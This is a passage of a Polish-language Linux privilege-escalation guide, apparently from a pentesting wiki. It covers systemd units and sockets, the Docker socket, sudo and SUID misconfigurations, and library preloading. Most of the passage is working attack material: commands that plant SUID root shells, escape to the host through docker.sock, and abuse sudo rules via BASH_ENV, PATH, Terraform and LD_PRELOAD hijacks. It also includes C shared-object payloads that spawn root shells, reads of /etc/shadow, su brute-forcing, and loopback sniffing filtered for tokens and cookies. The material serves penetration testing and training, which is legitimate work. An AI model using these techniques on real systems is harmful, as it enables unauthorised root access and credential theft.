> Jednostka, która zostanie aktywowana po wygaśnięciu tego timera. Argument to nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie określona, ta wartość domyślnie odnosi się do .service o tej samej nazwie co jednostka .timer, z wyjątkiem sufiksu. (Patrz wyżej.) Zaleca się, aby nazwa jednostki aktywowanej i nazwa jednostki timera były identyczne, z wyjątkiem sufiksu.

Dlatego, aby nadużyć tego uprawnienia, musisz:

- Znaleźć jakąś jednostkę systemd (np. `.service`), która **uruchamia plik binarny, do którego masz prawa zapisu**
- Znaleźć jednostkę systemd, która **uruchamia względną ścieżkę** i masz **uprawnienia zapisu** w **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer potrzebujesz uprawnień root i wykonania:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** przez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tej samej lub różnych maszynach w modelach klient‑serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets można konfigurować przy użyciu plików `.socket`.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się, ale w skrócie służą do **wskazania, gdzie będą nasłuchiwać** gniazda (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchiwania itp.)
- `Accept`: Przyjmuje argument boolean. Jeśli **true**, dla każdego przychodzącego połączenia **tworzony jest osobny egzemplarz usługi**, a jedynie gniazdo połączenia jest mu przekazywane. Jeśli **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki service**, i tylko jedna jednostka service jest tworzona dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie jedna jednostka service bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie false**. Ze względów wydajnościowych zaleca się pisać nowe demony w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **gniazd**/FIFO, odpowiednio. Pierwszy token linii poleceń musi być absolutną nazwą pliku, po którym następują argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **gniazd**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla sockets z Accept=no. Domyślnie ustawione na usługę o tej samej nazwie co socket (z zamienionym sufiksem). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie wykonany przed utworzeniem socketu. W takim przypadku **prawdopodobnie będziesz musiał poczekać na ponowne uruchomienie maszyny.**\
_Uwaga: system musi korzystać z tej konfiguracji pliku socket, w przeciwnym razie backdoor nie zostanie wykonany_

### Socket activation + writable unit path (create missing service)

Kolejna miskonfiguracja o dużym wpływie to:

- jednostka socket z `Accept=no` i `Service=<name>.service`
- odwoływana jednostka service nie istnieje
- atakujący może zapisać do `/etc/systemd/system` (lub innej ścieżki przeszukiwania jednostek)

W takim przypadku atakujący może utworzyć `<name>.service`, a następnie wywołać ruch do socketu, aby systemd załadował i uruchomił nową usługę jako root.

Szybki przebieg:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Gniazda zapisywalne

Jeśli **zidentyfikujesz jakiekolwiek gniazdo zapisywalne** (_mówimy tu o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać podatność.

### Enumeracja Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że mogą istnieć pewne **sockets nasłuchujące żądań HTTP** (_nie mówię tu o plikach .socket, tylko o plikach działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Jeśli gniazdo **odpowiada na żądania HTTP**, możesz z nim **komunikować się** i być może **exploit some vulnerability**.

### Zapisowalny Docker socket

Docker socket, często znajdujący się pod `/var/run/docker.sock`, to krytyczny plik, który powinien być zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie dostępu zapisu do tego gniazda może prowadzić do privilege escalation. Poniżej opisano, jak można to osiągnąć oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp zapisu do Docker socket, możesz escalate privileges, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić container z root-level access do systemu plików hosta.

#### **Using Docker API Directly**

W przypadkach, gdy Docker CLI nie jest dostępne, docker socket nadal można manipulować za pomocą Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia container, który montuje katalog root systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z containerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po nawiązaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w containerze z root-level access do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia zapisu do docker socket, ponieważ jesteś **inside the group `docker`** masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **more ways to break out from containers or abuse container runtimes to escalate privileges** w:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system komunikacji międzyprocesowej (IPC), który umożliwia aplikacjom efektywną współpracę i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

System jest wszechstronny, wspierając podstawową IPC, która usprawnia wymianę danych między procesami, przypominając ulepszone UNIX domain sockets. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając integrację komponentów systemowych. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus wspiera zdalny system obiektów, upraszczając żądania usług i wywołania metod między aplikacjami, upraszczając procesy, które wcześniej były złożone.

D-Bus działa na modelu **allow/deny**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego efektu pasujących reguł polityki. Te polityki określają interakcje z bus'em, co potencjalnie może prowadzić do eskalacji uprawnień poprzez wykorzystanie tych zezwoleń.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest pokazany poniżej, szczegółowo opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalnie, podczas gdy polityki w kontekście "default" dotyczą wszystkich nieobjętych innymi konkretnymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate and exploit komunikację D-Bus tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieci i określić pozycję maszyny.

### Ogólne enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Szybka diagnoza filtrowania wychodzącego

Jeśli host może uruchamiać polecenia, ale callbacks zawodzą, szybko rozdziel filtrowanie DNS, warstwy transportu, proxy i tras:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie mogłeś wcześniej wchodzić w interakcję, zanim uzyskasz do niej dostęp:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasyfikuj nasłuchujące usługi według docelowego adresu:

- `0.0.0.0` / `[::]`: wystawione na wszystkich interfejsach lokalnych.
- `127.0.0.1` / `::1`: tylko lokalne (good tunnel/forward candidates).
- Specyficzne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zazwyczaj osiągalne tylko z segmentów wewnętrznych.

### Proces triage usług dostępnych tylko lokalnie

Kiedy przejmiesz hosta, usługi przypięte do `127.0.0.1` często stają się po raz pierwszy osiągalne z twojej powłoki. Szybki lokalny proces to:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS jako skaner sieciowy (tryb tylko sieciowy)

Poza lokalnymi kontrolami PE, linPEAS może działać jako ukierunkowany skaner sieciowy. Wykorzystuje dostępne binarki w `$PATH` (zazwyczaj `fping`, `ping`, `nc`, `ncat`) i nie instaluje żadnych narzędzi.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Jeśli przekażesz `-d`, `-p` lub `-i` bez `-t`, linPEAS zachowuje się jak pure network scanner (pomijając resztę privilege-escalation checks).

### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz przechwycić credentials.
```
timeout 1 tcpdump
```
Szybkie praktyczne sprawdzenia:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) jest szczególnie cenny podczas post-exploitation, ponieważ wiele usług dostępnych wyłącznie wewnętrznie ujawnia tam tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture teraz, parse później:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** są w systemie, którzy z nich mogą się **zalogować** i którzy mają **uprawnienia roota:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Niektóre wersje Linuksa były dotknięte bugiem, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Groups

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać Ci uprawnienia roota:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku nie ma nic interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** środowiska **spróbuj zalogować się jako każdy użytkownik** przy użyciu tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego szumu i na komputerze dostępne są binaria `su` oraz `timeout`, możesz spróbować brute-force'ować użytkownika przy użyciu [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje brute-force'ować użytkowników.

## Nadużycia związane z zapisem w $PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać do jakiegoś katalogu znajdującego się w $PATH**, możesz być w stanie escalate privileges przez **utworzenie backdoora w zapisywalnym katalogu** o nazwie pewnego polecenia, które ma być wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z katalogu znajdującego się wcześniej** niż twój zapisywalny katalog w $PATH.

### SUDO i SUID

Możesz mieć pozwolenie na uruchomienie pewnego polecenia za pomocą sudo lub plik może mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików, a nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`; teraz jest trywialnie uzyskać powłokę, dodając ssh key do katalogu `root` lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Dyrektywa ta pozwala użytkownikowi na **set an environment variable** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało załadować dowolną bibliotekę python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywne zachowanie startowe Basha, aby uruchomić dowolny kod jako root przy wywołaniu dozwolonego polecenia.

- Why it works: Dla nieinteraktywnych powłok Bash ocenia `$BASH_ENV` i wczytuje ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowany przez sudo, twój plik zostanie wczytany z uprawnieniami roota.

- Requirements:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Uszczelnianie:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`; zamiast tego stosuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie I/O sudo oraz alertowanie, gdy zachowane zmienne środowiskowe są używane.

### Terraform przez sudo przy zachowanym HOME (!env_reset)

Jeśli sudo pozostawia środowisko niezmienione (`!env_reset`) jednocześnie pozwalając na `terraform apply`, `$HOME` pozostaje katalogiem użytkownika wywołującego. Terraform wówczas ładuje **$HOME/.terraformrc** jako root i respektuje `provider_installation.dev_overrides`.

- Wskaż wymagany provider na zapisywalny katalog i umieść złośliwy plugin nazwany jak provider (np. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform nie powiedzie się podczas Go plugin handshake, ale wykona payload jako root zanim zakończy działanie, pozostawiając SUID shell.

### TF_VAR overrides + symlink validation bypass

Zmienne Terraform można przekazać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, które przetrwają, gdy sudo zachowa środowisko. Słabe walidacje takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` można obejść za pomocą symlinków:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rozwiązuje dowiązanie symboliczne i kopiuje rzeczywisty plik `/root/root.txt` do miejsca czytelnego dla atakującego. Ten sam sposób można wykorzystać do **zapisania** w ścieżkach uprzywilejowanych przez wstępne utworzenie docelowych dowiązań symbolicznych (np. wskazujących ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo może być skonfigurowane z `requiretty`, co wymusza uruchamianie sudo tylko z interaktywnego TTY. Jeśli ustawione jest `!requiretty` (lub opcja jest nieobecna), sudo może być wykonywane z kontekstów nieinteraktywnych, takich jak reverse shells, cron jobs lub skrypty.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający wpisy zapisywalne przez atakującego (np. `/home/<user>/bin`), dowolne polecenie względne wewnątrz dozwolonego przez sudo celu może zostać podmienione.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt lub plik binarny, który wywołuje polecenia bez ścieżek bezwzględnych (`free`, `df`, `ps`, itp.) oraz wpis w PATH zapisywalny i przeszukiwany jako pierwszy.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo omijanie ścieżek wykonywania
**Przejdź**, aby odczytać inne pliki lub użyj **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty jest **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez określonej ścieżki polecenia

Jeśli **uprawnienie sudo** jest przyznane dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli plik **suid** **wywołuje inne polecenie bez określenia jego ścieżki (zawsze sprawdź zawartość dziwnego pliku SUID za pomocą** _**strings**_**)**).

[Przykłady payloadów do uruchomienia.](payloads-to-execute.md)

### SUID binary z określoną ścieżką polecenia

Jeśli plik **suid** **wywołuje inne polecenie podając ścieżkę**, wtedy możesz spróbować **wyeksportować funkcję** nazwaną tak, jak polecenie, które wywołuje plik suid.

Na przykład, jeśli plik suid wywołuje _**/usr/sbin/service apache2 start**_ musisz spróbować utworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wtedy, gdy wywołasz suid binary, ta funkcja zostanie wykonana

### Writable script executed by a SUID wrapper

Częstą miskonfiguracją custom-app jest root-owned SUID binary wrapper, który wykonuje script, podczas gdy sam script jest zapisywalny przez low-priv users.

Typowy wzorzec:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Jeśli `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać polecenia payload i następnie uruchomić SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Szybkie sprawdzenia:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ta ścieżka ataku jest szczególnie częsta w "maintenance"/"backup" wrappers dostarczanych w `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Jednak, aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku wykonywalnych plików **suid/sgid**, system egzekwuje pewne warunki:

- Loader pomija **LD_PRELOAD** dla programów, gdy rzeczywiste ID użytkownika (_ruid_) nie odpowiada efektywnemu ID (_euid_).
- Dla programów z **suid/sgid**, wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które same są **suid/sgid**.

Eskalacja uprawnień może wystąpić, jeśli masz możliwość uruchamiania poleceń przy użyciu `sudo`, a wynik `sudo -l` zawiera zapis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala, aby zmienna środowiskowa **LD_PRELOAD** była zachowywana i rozpoznawana nawet podczas uruchamiania poleceń z `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może być wykorzystany, jeśli atakujący kontroluje **LD_LIBRARY_PATH** env variable, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Jeśli natkniesz się na binarkę z uprawnieniami **SUID**, która wydaje się nietypowa, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje możliwość wykorzystania.

Aby to wykorzystać, należy utworzyć plik w języku C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do współdzielonego obiektu (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
